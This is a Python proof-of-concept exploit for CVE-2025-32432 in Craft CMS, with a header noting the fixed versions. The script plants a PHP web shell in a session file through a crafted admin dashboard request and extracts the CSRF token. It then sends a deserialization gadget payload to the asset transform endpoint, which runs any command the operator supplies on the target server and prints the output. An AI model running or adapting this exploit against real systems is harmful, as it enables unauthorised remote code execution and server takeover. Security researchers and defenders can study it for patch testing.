## CVE-2025-32432 :: Proof of Concept
## Fixed in fixed in Craft 3.9.15, 4.14.15, and 5.6.17.

import sys
import urllib.parse
import urllib3
import requests
import argparse
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Argument parsing
parser = argparse.ArgumentParser(description='CraftCMS CVE-2025-32432 Proof of Concept')
parser.add_argument('-u', '--url', required=True, help='Target URL of the CraftCMS instance (e.g., http://example.com/cmsblog/)')
parser.add_argument('-c', '--command', required=True, help='Command to execute on the target server (e.g., "id" or "ls -la /tmp")')
parser.add_argument('-a', '--assetid', default='1', help='Asset ID to use for the exploit (default: 1)')
args = parser.parse_args()

url = args.url
cmd = args.command
asset_id = args.assetid

php_payload = f'<?=shell_exec($_GET["cmd"]);die()?>'

print('[ * ] CVE-2025-32432 :: Proof of Concept')

def custom_make_request(self, conn, method, url_path, **httplib_request_kw):
    url_path = urllib.parse.unquote(url_path)
    return self._original_make_request(conn, method, url_path, **httplib_request_kw)

urllib3.connectionpool.HTTPConnectionPool._original_make_request = urllib3.connectionpool.HTTPConnectionPool._make_request
urllib3.connectionpool.HTTPConnectionPool._make_request = custom_make_request

print(f'[ + ] Storing payload: {php_payload}')

session = requests.Session()

response = session.get(
    f'{url}/index.php',
    params=f'p=admin/dashboard&a={php_payload}',
    verify=False,
    timeout=10
)

session_id = session.cookies.get('CraftSessionId')
if not session_id:
    print('[ - ] Failed to get CraftSessionId cookie. Exiting.')
    sys.exit(1)

soup = BeautifulSoup(response.text, 'html.parser')
csrf_input = soup.find('input', {'name': 'CRAFT_CSRF_TOKEN'})

token = None
if csrf_input and csrf_input.get('value'):
    token = csrf_input.get('value')
else:
    match = re.search(r'name="CRAFT_CSRF_TOKEN"\s+value="([^"]+)"', response.text)
    if match:
        token = match.group(1)

if not token:
    print(f'[ - ] Failed to extract CSRF token.\n Exiting.')
    sys.exit(1)

print(f'[ + ] CSRF Token: {token}')

print(f'[ + ] Triggering RCE')

params = {
    'p': 'actions/assets/generate-transform',
    'cmd': cmd,
}

json_payload = {
    'assetId': asset_id,
    'handle': {
        'width': 123,
        'height': 123,
        'as hack': {
            'class': 'craft\\behaviors\\FieldLayoutBehavior',
            '__class': 'yii\\rbac\\PhpManager',
            '__construct()': [{
                'itemFile': f'/var/lib/php/sessions/sess_{session_id}',
            }]
        }
    }
}

headers = {
    'X-CSRF-Token': token,
    'Content-Type': 'application/json',
}

response = session.post(
    f'{url}/index.php',
    params=params,
    json=json_payload,
    headers=headers,
    verify=False,
    timeout=15
)

print(f'[ + ] Trigger Response Status Code: {response.status_code}')

if '?p=admin/dashboard&a=' not in response.text:
    print('[ ! ] Unexpected response. If running Craft 3.x, try a different asset ID or ensure PHP sessions are writable/readable.')

print('[ + ] Command Output:')
output = response.text.split('?p=admin/dashboard&a=', 1)
if len(output) > 1:
    print(output[1].strip())
else:
    print('[ ! ] No command output detected in the expected location.')
    print(response.text)
